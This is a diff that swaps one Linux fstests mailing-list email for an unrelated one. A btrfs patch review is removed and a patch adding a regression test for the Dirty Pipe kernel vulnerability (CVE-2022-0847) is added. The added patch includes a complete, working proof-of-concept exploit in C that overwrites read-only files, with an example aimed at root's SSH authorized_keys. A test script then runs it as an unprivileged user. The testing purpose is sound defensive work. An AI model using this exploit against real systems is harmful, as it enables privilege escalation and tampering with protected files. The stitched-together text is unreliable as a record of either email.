@@ -2,185 +2,340 @@ Return-Path: <fstests-owner@kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id 7BF73C433EF
-	for <linux-fstests@archiver.kernel.org>; Mon,  7 Mar 2022 01:43:18 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id 9B4FAC433F5
+	for <linux-fstests@archiver.kernel.org>; Tue,  8 Mar 2022 09:23:03 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S234592AbiCGBoJ (ORCPT
+        id S236177AbiCHJX5 (ORCPT
         <rfc822;linux-fstests@archiver.kernel.org>);
-        Sun, 6 Mar 2022 20:44:09 -0500
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:54336 "EHLO
+        Tue, 8 Mar 2022 04:23:57 -0500
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:50878 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S233543AbiCGBoI (ORCPT
-        <rfc822;fstests@vger.kernel.org>); Sun, 6 Mar 2022 20:44:08 -0500
-Received: from esa2.hgst.iphmx.com (esa2.hgst.iphmx.com [68.232.143.124])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id C1F4B2DAA7;
-        Sun,  6 Mar 2022 17:43:14 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple;
-  d=wdc.com; i=@wdc.com; q=dns/txt; s=dkim.wdc.com;
-  t=1646617394; x=1678153394;
-  h=from:to:cc:subject:date:message-id:references:
-   in-reply-to:content-id:content-transfer-encoding:
-   mime-version;
-  bh=vi0Z3pet8KL3E3j1fCRiLy7LBKBJuysF0GmNzmBp824=;
-  b=K124JcIKe/VAqkl0w2VLIBCZgrpZ7UJVBJl2LAuFdKOiREeKlDR03wu7
-   YZ+IJdQq8q2f+iHtrZWCTD+vHzPbGvTL9oGKPrKKZ/ZJvo4VRPqfMSuNQ
-   xz07f4qJtIIDSbOyobEPnH3OyjeCIJ6V9L5NMXcV60Xq1R12q63HYK0VM
-   Mfo5u5fNQcolnkjz4K2DgatVn2yPcopVx5oepGROX3ZcWmA0TBEwpx5yM
-   mDnQrOEsfZXMOMaynN8vggoCh5icfs3rtgdreByNDA9q+0viafFfjU1bu
-   Hlfou/Cx6FN1dNyzB6koyXxQLQUardUcw66hItQZEm6zw4ASZQ5RUTqoS
-   A==;
-X-IronPort-AV: E=Sophos;i="5.90,160,1643644800"; 
-   d="scan'208";a="298755299"
-Received: from mail-bn8nam12lp2171.outbound.protection.outlook.com (HELO NAM12-BN8-obe.outbound.protection.outlook.com) ([104.47.55.171])
-  by ob1.hgst.iphmx.com with ESMTP; 07 Mar 2022 09:43:13 +0800
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
- b=gDlY5DoeO2v9s3fERO9+DvJLYFDKB+uVZFsN/XrB5LbKjUGMdfmb1bGxZPSik31LmmLEFPxMLF5celOdmPB4JbRYKj9zJ9Os5VdQbvk7ByqDq6lFMOLrGnfnc7GjddyHmuZI7cy8SUnxqNxl8rNZxtx048HT+Z32nwmnKKhBKAcU13T89UFExxmVU0NyQGd/Nf5ToZNpTGyL7AvDGnbK0b55iyBQEEUdU/p5UOOYkf+qm1++D/E4fBQFOIy0LOaqF84Fw9nHRIKFO46CqTF6KhsDcU0y1h366hhDB2hRgcdOKsIuxer2o6KiayubN4cufkqwmOuhhIIbNUfnpwSvUA==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector9901;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=vjpKHYrMfFr8q0FR3XxS/qwogCqCfgDgB0/eIn/vEkU=;
- b=e17z+MCReE5Ezj7muURxhz6dT7Qu3J+NQ6WUUYYZWsR6VIXdiy/rgBWBr5VgbQaEtpFrFPWRJwrzLw/VUB0dluL7kD3CQqjRgET9snc/QluE/zGDv/xnq5lLWXUd1XZCZI/dTWR8eQuM9xwg8kWp3L46ky6ymDdiH0x63VzrthGNy2AG2Yi7d1udRJ2GTtZe2dPwtVOevBW19dzJakG9GUKvTvksnZMzq4M1tEA1v9KEgi8PxEu14Vymf/9HrBThQb3rzwB8lD2TZqmhc+IgpURcYIKvoCaOsN3LsV2MOLo7bq+1sB4WMYDID/PmEwh4JyDPTKR3l3C9zyKklLbruw==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=wdc.com; dmarc=pass action=none header.from=wdc.com; dkim=pass
- header.d=wdc.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=sharedspace.onmicrosoft.com; s=selector2-sharedspace-onmicrosoft-com;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=vjpKHYrMfFr8q0FR3XxS/qwogCqCfgDgB0/eIn/vEkU=;
- b=xRbvyd+wnKO/WNnl2/lmdhDz5idS8N9V7Mp/R5AEieegdqqXMF1NGCb6dRljH0cNfc4kGvHKNqs6iaYSFeKFhnAcA9PyLti11FgwlLzLuoLYnySPtP68iRq8/Dw5VZUJabOk5FQJOvU+N9dX0+OnmcM3jXKMBpGadN9GgPypbr8=
-Received: from SJ0PR04MB7776.namprd04.prod.outlook.com (2603:10b6:a03:300::11)
- by CY1PR04MB2331.namprd04.prod.outlook.com (2a01:111:e400:c638::12) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.5038.14; Mon, 7 Mar
- 2022 01:43:11 +0000
-Received: from SJ0PR04MB7776.namprd04.prod.outlook.com
- ([fe80::d179:1a80:af1d:e8ee]) by SJ0PR04MB7776.namprd04.prod.outlook.com
- ([fe80::d179:1a80:af1d:e8ee%7]) with mapi id 15.20.5038.026; Mon, 7 Mar 2022
- 01:43:11 +0000
-From:   Naohiro Aota <Naohiro.Aota@wdc.com>
-To:     Shinichiro Kawasaki <shinichiro.kawasaki@wdc.com>
-CC:     "fstests@vger.kernel.org" <fstests@vger.kernel.org>,
-        "linux-btrfs@vger.kernel.org" <linux-btrfs@vger.kernel.org>,
-        Johannes Thumshirn <Johannes.Thumshirn@wdc.com>,
-        Damien Le Moal <damien.lemoal@opensource.wdc.com>
-Subject: Re: [PATCH] common/rc: avoid mixed mode for zoned btrfs
-Thread-Topic: [PATCH] common/rc: avoid mixed mode for zoned btrfs
-Thread-Index: AQHYJ6NcJ4Pob8HROkWrmdRfsJRLrayzOiAA
-Date:   Mon, 7 Mar 2022 01:43:11 +0000
-Message-ID: <20220307014310.l4rmhlrydc73myvz@naota-xeon>
-References: <20220222041908.3213724-1-shinichiro.kawasaki@wdc.com>
-In-Reply-To: <20220222041908.3213724-1-shinichiro.kawasaki@wdc.com>
-Accept-Language: ja-JP, en-US
-Content-Language: en-US
-X-MS-Has-Attach: 
-X-MS-TNEF-Correlator: 
-authentication-results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=wdc.com;
-x-ms-publictraffictype: Email
-x-ms-office365-filtering-correlation-id: f7a71be8-7aef-4a52-24d4-08d9ffdbd69e
-x-ms-traffictypediagnostic: CY1PR04MB2331:EE_
-x-microsoft-antispam-prvs: <CY1PR04MB233194E7854FA8DAC4EB1A1E8C089@CY1PR04MB2331.namprd04.prod.outlook.com>
-wdcipoutbound: EOP-TRUE
-x-ms-exchange-senderadcheck: 1
-x-ms-exchange-antispam-relay: 0
-x-microsoft-antispam: BCL:0;
-x-microsoft-antispam-message-info: 5EfIwdno9PhLdsflxdu0sWyLpu7Do1f1eESZibNns1CG9FELjjJfNVawIIltYYOAnDMB+qHMIfEgKiVgHJdaBX19xr6S90SvCwK0bez6D20M/Mpl+18lQEturXSmMOOdgLlpZUDPSvr/TOhQg6ZkJHUDMVHtL0pVyfI++l89gmNOmlhNvYGZL/sQGbsS0IyJdpB2rpv3PXz+NOunRYDQY86VHLTPcsj0ivL66PRkBhEJItlAA9rpOFzPOwYTsJ8Y3gPKbcG4l0r2eucWUeT3LmEYp2qiHCMD/+v4bvNUi4OtJKVRNl1TnUUR8aySlIMRYrQFb5rXKpL486LISJRbpjzHB/L72VYwsNVt9ehZUZI5ggoU4gppS2zDaqsQGNF5URdn1rUw0inT6QiwvanNAD317sw9mtuyp8pL7mLe2HFia6i2OkyMz8K14/eTFNXkI2p3rkiye75XIjAzZuLvedLezu9lQ3Haoa0GzWiWNNnkCKFcN3fWdqDOEoEZfhgVN5fX7Ocb6o9XoB8hO5ud9g2jksHXRRy3oaFdPyzcfVWFdxG1+wH2i/CI4AXod1djduhqYVEUlU8N/mDQ4LpPuV26yIYfgYAW0weBSX/mpj8gG+k+8cmbfwPD7UkcF0WRp1jFYgTRnreidAx8jXePCQeOaV5SeurlgQ8v5yyhVhQXcW9E1b+m805xx8BNwIRN1HlZ4JpW4xdNBAddPKGBgZEkQd7sQZ/W3iPYYT5xIAJ4Iw7LxRIBmbFaLl4DbUF9KlzXXJ/bcANcMKuNJMcHJ2HlRfh0hlFbKSTA40H0VE4ZeB1Ru+CB3wUr8AE2Y+Yn
-x-forefront-antispam-report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR04MB7776.namprd04.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230001)(7916004)(4636009)(366004)(5660300002)(4326008)(8676002)(66446008)(76116006)(66476007)(6862004)(6506007)(71200400001)(508600001)(450100002)(91956017)(966005)(33716001)(83380400001)(66946007)(64756008)(122000001)(6486002)(66556008)(38100700002)(316002)(38070700005)(8936002)(1076003)(54906003)(186003)(26005)(82960400001)(6512007)(9686003)(2906002)(86362001)(6636002)(17423001);DIR:OUT;SFP:1102;
-x-ms-exchange-antispam-messagedata-chunkcount: 1
-x-ms-exchange-antispam-messagedata-0: =?us-ascii?Q?6+iUEHWCA9uMsUGrvCoIfuWuZ0A3iVVuxU8y67JzR410ZqkE6/ZouvNlRSFU?=
- =?us-ascii?Q?QyR9gjAJm3+tuxl9+/j/x0PUGNzVnlZO+YokL1HaCjEu3ZiLtLfSlRxr0Ntr?=
- =?us-ascii?Q?9zGwfQPA3NIv8ZCdrsd/4cQ592TqYyE8QoaG8NfVxwytW0qM1cCHIiuUvTKZ?=
- =?us-ascii?Q?C4EAUQZxtAnbkwtEGN/TP63/wZhm14GDaY0S8Wrz2AG5610Sy/xnOrwxpcWZ?=
- =?us-ascii?Q?JYVjVKeMqU8K2biHDxCEp+5t+bc7iN36BKhv6Pvhl3QwpR8lYiUrcUYzGAdt?=
- =?us-ascii?Q?KW5Qs3oyJLfHDzKp+L19H1p5rhC4XWrD3+P/2QYxzaSjkyNXCbGQ7q8rZU1x?=
- =?us-ascii?Q?3MxNJJRvJFtriSJQb1NKzleZiXaYOfeCIj3nDEwQNsgCeR8K4wOT7D0GrNYr?=
- =?us-ascii?Q?Wzi7tdyejsQp78fsJC2D6a1vGlcO2Nx1v1YoI3xTtkZpxgxDcOyXpDPC967K?=
- =?us-ascii?Q?xCkQHl8TK2GHKQOfY+dY/P6Dy5nsYZEuPAKmIu1ZuBmr85XWmQZhFEm0KLrV?=
- =?us-ascii?Q?I0pUyawmG1F3VjlmUm9bPr83fEjjmSM8Pq6Y+z1kX3c5ZjfEXUg6iJC4lFa5?=
- =?us-ascii?Q?OuylefnJ7W6QSnyG0a11CcKXiSjdT8cd6iDt/DrxP9OMranZrihMrj/lzWvv?=
- =?us-ascii?Q?hv8C6pOdSuKWfdEmXuDV0rbYASco705Gm9adjB0U3kx6eGN3rvMdBVS2FkEm?=
- =?us-ascii?Q?zgCeklUTLOgP8v/nkBDTtTFHTwV5dfZruMomknAMObQg+tmjMKi3Ja/ijklX?=
- =?us-ascii?Q?EdedB9dNLrK6oCYyy/wpWjlljrb17g5eg9+CzB/EaoYFFUbBoh2bUjnHFQK7?=
- =?us-ascii?Q?t2Cru3jodx2ZIH7lScexaafzRSQBrMVJ0u4t6ii5RDYYuRVKDGXfvez4HTyD?=
- =?us-ascii?Q?2REwNAL04roZsHONKOa3u+imQzXaLOoEpZXV+PI319BV2vBGKAU+RNfW3X38?=
- =?us-ascii?Q?6VUWjHjrr4t2fg92IQqhx+LVIeE63I5xV+fCKCiVPBqUVeS70omwj+kXon3V?=
- =?us-ascii?Q?TDzrc9VqTk1k6kkTHrjDLVk6zYfZEZAKVCVYyWT8HwD68DXHueG5kgy5+Q1P?=
- =?us-ascii?Q?iNIRWQQH28q3ef5++apOAEtRiGWpKT7ay2RFZ13KhwGTJevLgdFc4c+CJmRR?=
- =?us-ascii?Q?SStqQWmlo0STnFerqoHJYDEBpgkFSH+Z7KdcXVb5BC2HYiYWk9EALLhbYB+S?=
- =?us-ascii?Q?M1z1HovDKqjjmYYx4nopSOplmexHT5BhYwLvK+mNWXzJ8oagSwhO0bCqxpoW?=
- =?us-ascii?Q?mkpaspgxkRgPLuAJ/OD1vLByOkmfGf3qNSwllp7Tl9TYdTS0W7VY8nkHph30?=
- =?us-ascii?Q?rxxJzOXIAsB85HWBk6puSNvtFGS3w7262SikMXdc1uj+UZt6xsa4YOQnpv8u?=
- =?us-ascii?Q?EgzsEfWw5TvDjXDqjWIUtVIruPAtS5lQIfI96/97U/810+VCLSNoYasYIIsA?=
- =?us-ascii?Q?lO5MDSVmf8OF3BoJTR+h8Y3fsn87M8kMKlGcq3jq2Rsb2nlvwajza0xXx89H?=
- =?us-ascii?Q?mWblsQBXYkyWm5cn7r0VwV42V1WwEwSAjU4P7JjDQeIXUM5C/yTIdHLvlHte?=
- =?us-ascii?Q?zxZpC4fVRzIZ4KE0FfUedN1qcdIx7tTjoqM+t/zfwOuzTvfrBY9nFamNI30j?=
- =?us-ascii?Q?Wd12v/dNAxEx1iMF1J/xcl8=3D?=
-Content-Type: text/plain; charset="us-ascii"
-Content-ID: <85FA32714C22F145AE9F2C8ADD6F3B0A@namprd04.prod.outlook.com>
-Content-Transfer-Encoding: quoted-printable
+        with ESMTP id S234844AbiCHJX5 (ORCPT
+        <rfc822;fstests@vger.kernel.org>); Tue, 8 Mar 2022 04:23:57 -0500
+Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTP id A6A232DAAF
+        for <fstests@vger.kernel.org>; Tue,  8 Mar 2022 01:22:58 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+        s=mimecast20190719; t=1646731377;
+        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+         to:to:cc:cc:mime-version:mime-version:
+         content-transfer-encoding:content-transfer-encoding;
+        bh=R18qLmHZuQrqp6sRaln8ZEBajNLmhlcBe8v7Zu8uBM4=;
+        b=dxiTK4oWiv8nusAEuRJ2Fw79HLf3AM1zRxPV7y0rFvfZYujps1NomdTx/LncohekHNQR4o
+        WsmnjfARIw69DbV5dmqW2qzQcNAGWoa+5ketVZm/k9FaBCG4IwRJOKgjbnsRnzqFvFQRNG
+        SSetWQneKiYwsV69tvFKc9dAv3C6bgw=
+Received: from mimecast-mx01.redhat.com (mimecast-mx01.redhat.com
+ [209.132.183.4]) by relay.mimecast.com with ESMTP with STARTTLS
+ (version=TLSv1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ us-mta-374-JS2_rMKKMguNhH72KEygRQ-1; Tue, 08 Mar 2022 04:22:54 -0500
+X-MC-Unique: JS2_rMKKMguNhH72KEygRQ-1
+Received: from smtp.corp.redhat.com (int-mx06.intmail.prod.int.phx2.redhat.com [10.5.11.16])
+        (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
+        (No client certificate requested)
+        by mimecast-mx01.redhat.com (Postfix) with ESMTPS id A6BF11091DA1;
+        Tue,  8 Mar 2022 09:22:53 +0000 (UTC)
+Received: from zlang-laptop.redhat.com (ovpn-12-89.pek2.redhat.com [10.72.12.89])
+        by smtp.corp.redhat.com (Postfix) with ESMTP id 76B927AB76;
+        Tue,  8 Mar 2022 09:22:51 +0000 (UTC)
+From:   Zorro Lang <zlang@redhat.com>
+To:     fstests@vger.kernel.org
+Cc:     max.kellermann@ionos.com
+Subject: [PATCH] fstests: test dirty pipe vulnerability issue of CVE-2022-0847
+Date:   Tue,  8 Mar 2022 17:22:48 +0800
+Message-Id: <20220308092248.786739-1-zlang@redhat.com>
 MIME-Version: 1.0
-X-OriginatorOrg: wdc.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: SJ0PR04MB7776.namprd04.prod.outlook.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: f7a71be8-7aef-4a52-24d4-08d9ffdbd69e
-X-MS-Exchange-CrossTenant-originalarrivaltime: 07 Mar 2022 01:43:11.1526
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: b61c8803-16f3-4c35-9b17-6f65f441df86
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: Yh6IoKHPkDiOOHAvwp9xNFyZJwA1Vn+Vpi2FZ5qGNnBr6dMuMqgT3pYrocZvSZb/ViYJ1gidq16YUD/csRgP1A==
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: CY1PR04MB2331
+Content-Transfer-Encoding: 8bit
+X-Scanned-By: MIMEDefang 2.79 on 10.5.11.16
 Precedence: bulk
 List-ID: <fstests.vger.kernel.org>
 X-Mailing-List: fstests@vger.kernel.org
 
-Looks good.
+Test for the Dirty Pipe vulnerability (CVE-2022-0847) caused by an
+uninitialized  "pipe_buffer.flags" variable. The bug cause a file
+can be overwritten even if a user/process is not permitted to write
+it. It's fixed by 9d2231c5d74e ("lib/iov_iter: initialize "flags" in
+new pipe_buffer").
 
-Reviewed-by: Naohiro Aota <naohiro.aota@wdc.com>
+Cc: Max Kellermann <max.kellermann@ionos.com>
+Signed-off-by: Zorro Lang <zlang@redhat.com>
+---
 
-On Tue, Feb 22, 2022 at 01:19:08PM +0900, Shin'ichiro Kawasaki wrote:
-> When the helper function _scratch_mkfs_sized is called with small
-> filesystem size and FSTYP=3Dbtrfs, it calls mkfs.btrfs with --mixed optio=
-n
-> to enable mixed mode. However, mkfs.btrfs with --mixed option fails for
-> zoned block devices since btrfs does not support mixed mode together
-> with zoned mode. To avoid this failure, do not set --mixed option when
-> the scratch device is a zoned block device.
->=20
-> Signed-off-by: Shin'ichiro Kawasaki <shinichiro.kawasaki@wdc.com>
-> ---
-> This is the left work of the series posted before [1]. Reposted as a sing=
-le
-> patch.
->=20
-> Change from the previous post:
-> * Keep change minimum btrfs device size as 256MiB.
->=20
-> [1] https://lore.kernel.org/fstests/20220221110254.y2yb7xdlf22ahh7k@shind=
-ev/
->=20
->  common/rc | 8 ++++----
->  1 file changed, 4 insertions(+), 4 deletions(-)
->=20
-> diff --git a/common/rc b/common/rc
-> index e2d3d72a..d326572f 100644
-> --- a/common/rc
-> +++ b/common/rc
-> @@ -1078,10 +1078,10 @@ _scratch_mkfs_sized()
->  		;;
->  	btrfs)
->  		local mixed_opt=3D
-> -		# minimum size that's needed without the mixed option.
-> -		# Ref: btrfs-prog: btrfs_min_dev_size()
-> -		# Non mixed mode is also the default option.
-> -		(( fssize < $((256 * 1024 *1024)) )) && mixed_opt=3D'--mixed'
-> +		# Mixed option is required when the filesystem size is small and
-> +		# the device is not zoned. Ref: btrfs-progs: btrfs_min_dev_size()
-> +		(( fssize < $((256 * 1024 * 1024)) )) &&
-> +			! _scratch_btrfs_is_zoned && mixed_opt=3D'--mixed'
->  		$MKFS_BTRFS_PROG $MKFS_OPTIONS $mixed_opt -b $fssize $SCRATCH_DEV
->  		;;
->  	jfs)
-> --=20
-> 2.34.1
-> =
+Hi,
+
+As the CVE-2022-0847 "Dirty Pipe Vulnerability" is public now, to cover this
+bug testing, I write this case to fstests.
+The main test program comes from Max Kellermann(https://dirtypipe.cm4all.com/),
+I just changed it a little bit, then help it run with xfstests frame.
+
+Please help to review, and feel free to tell me if it's not good to be in fstests.
+
+Thanks,
+Zorro
+
+ .gitignore            |   1 +
+ src/Makefile          |   2 +-
+ src/splice2pipe.c     | 155 ++++++++++++++++++++++++++++++++++++++++++
+ tests/generic/676     |  47 +++++++++++++
+ tests/generic/676.out |   9 +++
+ 5 files changed, 213 insertions(+), 1 deletion(-)
+ create mode 100644 src/splice2pipe.c
+ create mode 100755 tests/generic/676
+ create mode 100644 tests/generic/676.out
+
+diff --git a/.gitignore b/.gitignore
+index ba0c572b..a05c6058 100644
+--- a/.gitignore
++++ b/.gitignore
+@@ -125,6 +125,7 @@ tags
+ /src/runas
+ /src/seek_copy_test
+ /src/seek_sanity_test
++/src/splice2pipe
+ /src/splice-test
+ /src/stale_handle
+ /src/stat_test
+diff --git a/src/Makefile b/src/Makefile
+index 111ce1d9..7725c4aa 100644
+--- a/src/Makefile
++++ b/src/Makefile
+@@ -31,7 +31,7 @@ LINUX_TARGETS = xfsctl bstat t_mtab getdevicesize preallo_rw_pattern_reader \
+ 	dio-invalidate-cache stat_test t_encrypted_d_revalidate \
+ 	attr_replace_test swapon mkswap t_attr_corruption t_open_tmpfiles \
+ 	fscrypt-crypt-util bulkstat_null_ocount splice-test chprojid_fail \
+-	detached_mounts_propagation ext4_resize
++	detached_mounts_propagation ext4_resize splice2pipe
+ 
+ EXTRA_EXECS = dmerror fill2attr fill2fs fill2fs_check scaleread.sh \
+ 	      btrfs_crc32c_forged_name.py
+diff --git a/src/splice2pipe.c b/src/splice2pipe.c
+new file mode 100644
+index 00000000..88b58f7e
+--- /dev/null
++++ b/src/splice2pipe.c
+@@ -0,0 +1,155 @@
++/* SPDX-License-Identifier: GPL-2.0 */
++/*
++ * Copyright 2022 CM4all GmbH / IONOS SE
++ *
++ * author: Max Kellermann <max.kellermann@ionos.com>
++ *
++ * Proof-of-concept exploit for the Dirty Pipe
++ * vulnerability (CVE-2022-0847) caused by an uninitialized
++ * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
++ * file contents in the page cache, even if the file is not permitted
++ * to be written, immutable or on a read-only mount.
++ *
++ * This exploit requires Linux 5.8 or later; the code path was made
++ * reachable by commit f6dd975583bd ("pipe: merge
++ * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
++ * there before, it just provided an easy way to exploit it.
++ *
++ * There are two major limitations of this exploit: the offset cannot
++ * be on a page boundary (it needs to write one byte before the offset
++ * to add a reference to this page to the pipe), and the write cannot
++ * cross a page boundary.
++ *
++ * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
++ *
++ * Further explanation: https://dirtypipe.cm4all.com/
++ */
++#ifndef _GNU_SOURCE
++#define _GNU_SOURCE
++#endif
++#include <unistd.h>
++#include <fcntl.h>
++#include <stdio.h>
++#include <stdlib.h>
++#include <string.h>
++#include <sys/stat.h>
++#include <sys/user.h>
++
++/**
++ * Create a pipe where all "bufs" on the pipe_inode_info ring have the
++ * PIPE_BUF_FLAG_CAN_MERGE flag set.
++ */
++static void prepare_pipe(int p[2])
++{
++	if (pipe(p)) abort();
++
++	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
++	static char buffer[4096];
++
++	/* fill the pipe completely; each pipe_buffer will now have
++	   the PIPE_BUF_FLAG_CAN_MERGE flag */
++	for (unsigned r = pipe_size; r > 0;) {
++		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
++		write(p[1], buffer, n);
++		r -= n;
++	}
++
++	/* drain the pipe, freeing all pipe_buffer instances (but
++	   leaving the flags initialized) */
++	for (unsigned r = pipe_size; r > 0;) {
++		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
++		read(p[0], buffer, n);
++		r -= n;
++	}
++
++	/* the pipe is now empty, and if somebody adds a new
++	   pipe_buffer without initializing its "flags", the buffer
++	   will be mergeable */
++}
++
++int main(int argc, char **argv)
++{
++	if (argc != 4) {
++		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
++		return EXIT_FAILURE;
++	}
++
++	/* dumb command-line argument parser */
++	const char *const path = argv[1];
++	loff_t offset = strtoul(argv[2], NULL, 0);
++	const char *const data = argv[3];
++	const size_t data_size = strlen(data);
++	int page_size = sysconf(_SC_PAGESIZE);
++	if (page_size == -1)
++		page_size = 4096;
++
++	if (offset % page_size == 0) {
++		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
++		return EXIT_FAILURE;
++	}
++
++	const loff_t next_page = (offset | (page_size - 1)) + 1;
++	const loff_t end_offset = offset + (loff_t)data_size;
++	if (end_offset > next_page) {
++		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
++		return EXIT_FAILURE;
++	}
++
++	/* open the input file and validate the specified offset */
++	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
++	if (fd < 0) {
++		perror("open failed");
++		return EXIT_FAILURE;
++	}
++
++	struct stat st;
++	if (fstat(fd, &st)) {
++		perror("stat failed");
++		return EXIT_FAILURE;
++	}
++
++	if (offset > st.st_size) {
++		fprintf(stderr, "Offset is not inside the file\n");
++		return EXIT_FAILURE;
++	}
++
++	if (end_offset > st.st_size) {
++		fprintf(stderr, "Sorry, cannot enlarge the file\n");
++		return EXIT_FAILURE;
++	}
++
++	/* create the pipe with all flags initialized with
++	   PIPE_BUF_FLAG_CAN_MERGE */
++	int p[2];
++	prepare_pipe(p);
++
++	/* splice one byte from before the specified offset into the
++	   pipe; this will add a reference to the page cache, but
++	   since copy_page_to_iter_pipe() does not initialize the
++	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
++	--offset;
++	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
++	if (nbytes < 0) {
++		perror("splice failed");
++		return EXIT_FAILURE;
++	}
++	if (nbytes == 0) {
++		fprintf(stderr, "short splice\n");
++		return EXIT_FAILURE;
++	}
++
++	/* the following write will not create a new pipe_buffer, but
++	   will instead write into the page cache, because of the
++	   PIPE_BUF_FLAG_CAN_MERGE flag */
++	nbytes = write(p[1], data, data_size);
++	if (nbytes < 0) {
++		perror("write failed");
++		return EXIT_FAILURE;
++	}
++	if ((size_t)nbytes < data_size) {
++		fprintf(stderr, "short write\n");
++		return EXIT_FAILURE;
++	}
++
++	return EXIT_SUCCESS;
++}
+diff --git a/tests/generic/676 b/tests/generic/676
+new file mode 100755
+index 00000000..6092aac3
+--- /dev/null
++++ b/tests/generic/676
+@@ -0,0 +1,47 @@
++#! /bin/bash
++# SPDX-License-Identifier: GPL-2.0
++# Copyright (c) 2022 Red Hat, Inc.  All Rights Reserved.
++#
++# FS QA Test 676
++#
++# Test for the Dirty Pipe vulnerability (CVE-2022-0847) caused by an
++# uninitialized  "pipe_buffer.flags" variable, which fixed by:
++#   9d2231c5d74e ("lib/iov_iter: initialize "flags" in new pipe_buffer")
++#
++. ./common/preamble
++_begin_fstest auto quick
++
++# real QA test starts here
++_supported_fs generic
++_require_test
++_require_user
++_require_chmod
++_require_test_program "splice2pipe"
++
++localfile=$TEST_DIR/testfile.$seq
++
++# Create a file with 4k 0xff data, then make sure unprivileged user has readonly
++# permission on it
++$XFS_IO_PROG -f -t -c "pwrite 0 4k -S 0xff" $localfile >> $seqres.full 2>&1
++chmod 0644 $localfile
++# Test privileged user (xfstests generally run with root)
++echo "Test privileged user:"
++$here/src/splice2pipe $localfile 1 "AAAAAAAABBBBBBBB"
++# Part of 0xff will be overwritten if there's CVE-2022-0847 bug
++hexdump -C $localfile
++
++# Create a file with 4k 0xff data, then make sure unprivileged user has readonly
++# permission on it
++$XFS_IO_PROG -f -t -c "pwrite 0 4k -S 0xff" $localfile >> $seqres.full 2>&1
++chmod 0644 $localfile
++# Copy splice2pipe to a place which can be run by an unprivileged user (avoid
++# something likes /root/xfstests/src/splice2pipe)
++cp $here/src/splice2pipe $tmp.splice2pipe
++# Test unprivileged user's privilege escalation
++echo "Test unprivileged user:"
++su ${qa_user} -c "$tmp.splice2pipe $localfile 1 AAAAAAAABBBBBBBB"
++hexdump -C $localfile
++
++# success, all done
++status=0
++exit
+diff --git a/tests/generic/676.out b/tests/generic/676.out
+new file mode 100644
+index 00000000..f006e659
+--- /dev/null
++++ b/tests/generic/676.out
+@@ -0,0 +1,9 @@
++QA output created by 676
++Test privileged user:
++00000000  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
++*
++00001000
++Test unprivileged user:
++00000000  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
++*
++00001000
+-- 
+2.31.1
+
